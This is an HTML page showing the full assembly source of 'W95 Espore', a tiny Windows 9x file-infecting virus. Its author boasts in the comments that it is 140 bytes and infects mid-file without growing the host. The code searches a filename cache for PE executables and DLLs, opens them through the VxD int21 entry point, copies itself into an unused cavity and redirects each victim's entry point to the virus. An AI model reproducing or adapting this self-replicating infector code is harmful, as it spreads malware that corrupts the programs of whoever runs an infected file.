<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>espore.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;----------------------------  W95 ESPORE BY HenKy -----------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-AUTHOR:        HenKy</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-MAIL:          HenKy_@latinmail.com</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;-ORIGIN:        SPAIN</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">

 </span><span class="sc1">; WOW!!!!   140 BYTES !!!! AND 100% RING 3 !!!! (ONLY WINDOZE 9X CAN SUPPORT IT)</span><span class="sc0">

 </span><span class="sc1">; OF COURSE MIDFILE AND NO GROWING CAVITY TECH</span><span class="sc0">

 </span><span class="sc1">; IT SEARCHS FILENAMES INTO CACHE (AND PARASITE THEM) :-)     </span><span class="sc0">


 </span><span class="sc1">; THE 0C1000000H ADDRESS IS USED AS BUFFER BECOZ WE HAVE WRITE/READ</span><span class="sc0">
 
 </span><span class="sc1">; PRIVILEGES</span><span class="sc0">

 </span><span class="sc1">; THE BFF712B9h ADDRESS IS THE CALL VINT21 </span><span class="sc0">

 </span><span class="sc1">; THE INITIAL EDX VALUE POINTS TO A 28KB CACHE BUFFER WICH CONTAINS SEVERAL</span><span class="sc0">
 
 </span><span class="sc1">; FILENAMES WITH COMPLETE PATH (ONLY PE EXE/DLL )</span><span class="sc0">

</span><span class="sc2">.386P</span><span class="sc0">
</span><span class="sc9">.MODEL</span><span class="sc0"> </span><span class="sc10">FLAT</span><span class="sc0">
</span><span class="sc5">LOCALS</span><span class="sc0">

</span><span class="sc9">EXTRN</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc5">MIX_SIZ</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">FILE_END</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">MEGAMIX</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">MACROSIZE</span><span class="sc0">   </span><span class="sc9">MACRO</span><span class="sc0">                   
            </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc5">MIX_SIZ</span><span class="sc4">/</span><span class="sc2">00100</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc3">"0"</span><span class="sc0">
            </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc5">MIX_SIZ</span><span class="sc4">/</span><span class="sc2">00010</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc3">"0"</span><span class="sc0">
            </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc5">MIX_SIZ</span><span class="sc4">/</span><span class="sc2">00001</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc3">"0"</span><span class="sc0">
            </span><span class="sc9">ENDM</span><span class="sc0">    
</span><span class="sc9">.DATA</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc12">'BIEN PEKEÑO BIEN... LIKE AN ESPORE... HEHEHE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  
        </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc12">' W9X ESPORE SIZE = '</span><span class="sc0"> 
        </span><span class="sc5">MACROSIZE</span><span class="sc0">                

</span><span class="sc9">.CODE</span><span class="sc0">

</span><span class="sc5">MEGAMIX</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">; EDX: BUFFER</span><span class="sc0">
         </span><span class="sc1">; EAX: EIP</span><span class="sc0">
         </span><span class="sc1">; ECX: BUFFER</span><span class="sc0">
     
</span><span class="sc5">VINT21</span><span class="sc4">:</span><span class="sc0">             
        </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc2">0BFF712B9h</span><span class="sc0">   </span><span class="sc1">; MOV ECX,048BFF71H  ;-) Z0MBiE</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc12">'H'</span><span class="sc0">          </span><span class="sc1">; HenKy ;P</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">   </span><span class="sc1">; EDI: DELTA    </span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc2">0C1000000H</span><span class="sc0">  </span><span class="sc1">; ESI: BUFFER</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">EBP</span><span class="sc4">,</span><span class="sc8">EDI</span><span class="sc0">    </span><span class="sc1">; NOW: EBP=EDI=DELTA=INT21H</span><span class="sc0">

        </span><span class="sc1">;EDX: POINTER TO FNAME</span><span class="sc0">
        
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc2">28500</span><span class="sc0"> </span><span class="sc1">; LIMIT</span><span class="sc0">
</span><span class="sc5">PORK</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">],</span><span class="sc12">':C'</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">KAA</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0"> </span><span class="sc5">PORK</span><span class="sc0">
</span><span class="sc5">OK</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc2">00401000H</span><span class="sc0">
        </span><span class="sc5">OLD_EIP</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">WARNING</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">   
</span><span class="sc5">KAA</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3D02h</span><span class="sc0">                       
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">                       
        </span><span class="sc6">XCHG</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">               
        </span><span class="sc6">PUSHAD</span><span class="sc0">    </span><span class="sc1">; SAVE ECX,EBX,EDX,EBP,EDI</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">PHECT</span><span class="sc0">                  
        </span><span class="sc6">POPAD</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Eh</span><span class="sc0">                  
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">                           
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">PORK</span><span class="sc0">
                                           
</span><span class="sc5">PHECT</span><span class="sc4">:</span><span class="sc0">
                               
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">                 
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">                   
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">R_W</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">             
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+</span><span class="sc8">ECX</span><span class="sc4">]</span><span class="sc0">            
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"P"</span><span class="sc0">        
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">WARNING</span><span class="sc0">                
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,[</span><span class="sc8">EAX</span><span class="sc4">+</span><span class="sc2">28H</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0">   
        </span><span class="sc6">JB</span><span class="sc0"> </span><span class="sc5">WARNING</span><span class="sc0">  
        </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EBP</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,[</span><span class="sc8">EAX</span><span class="sc4">+</span><span class="sc2">34H</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+</span><span class="sc5">OLD_EIP</span><span class="sc4">-</span><span class="sc5">MEGAMIX</span><span class="sc4">],</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
        
</span><span class="sc5">PORRO</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc12">'B'</span><span class="sc0"> </span><span class="sc1">; hehehehe</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">PORRO</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0"> 
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">             
        </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc5">MIX_SIZ</span><span class="sc4">/</span><span class="sc2">4</span><span class="sc0">  
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">                                    
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                        
        </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">                                                     
        </span><span class="sc6">REP</span><span class="sc0"> </span><span class="sc6">MOVSD</span><span class="sc0">                                        
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">                        
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                                                       
</span><span class="sc5">W</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                    
</span><span class="sc5">R_W</span><span class="sc4">:</span><span class="sc0">      
        </span><span class="sc6">PUSHAD</span><span class="sc0">                         
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">                   
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">42h</span><span class="sc0">                     
        </span><span class="sc6">CDQ</span><span class="sc0">                            
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">                        
        </span><span class="sc6">POPAD</span><span class="sc0">                           
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4h</span><span class="sc0">                                                    
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc9">ALIGN</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">FILE_END</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">

</span><span class="sc9">END</span><span class="sc0"> </span><span class="sc5">MEGAMIX</span><span class="sc0">
</span></div></body>
</html>
